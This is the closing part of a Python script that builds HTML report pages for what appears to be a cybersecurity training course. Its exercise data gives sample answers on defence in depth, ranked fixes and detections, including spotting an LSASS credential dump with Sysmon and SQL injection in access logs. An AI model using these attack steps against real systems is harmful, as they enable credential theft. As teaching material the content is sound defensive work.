      {'t':'free','id':'d2','label':'D2 · Defence-in-depth analysis','hint':'Per key path: what FAILED, what HELD, what would stop it.','ph':'SQLi foothold: app control (parameterisation) FAILED\n  BUT LSASS dump caught by Sysmon 10 (endpoint HELD)\n  would have stopped it: least privilege + WDAC at the endpoint layer\nOne control at ANY layer breaks the chain.'},
      {'t':'free','id':'d3','label':'D3 · Prioritised remediation + detections','hint':'Leverage-ranked fixes + a detection per layer.','ph':'1 MFA (phishing + stolen tokens) 2 patch (S5 exploits) 3 least-priv (S6)\n4 parameterise (S8) 5 TLS+cookie flags (S9) 6 CSPM/block-public (S10)\nDetections: Sysmon 10 LSASS ; access-log SQLi ; ARP anomaly ; CSPM public-bucket'},
    ]},
  ],
}


def main():
    only = sys.argv[1] if len(sys.argv) > 1 else None
    for key, d in sorted(SESSIONS.items()):
        if only and key != only:
            continue
        out = os.path.join(DOCS, 'session-%s' % d['num'], 'report.html')
        html = build(key, d, SESSIONS)
        io.open(out, 'w', encoding='utf-8', newline='').write(html)
        n = sum(1 for sec in d['sections'] for it in sec['items'] if it.get('t', 'step') == 'step')
        print('wrote %-40s  (%d steps)  %d bytes' % (out, n, len(html)))


if __name__ == '__main__':
    main()
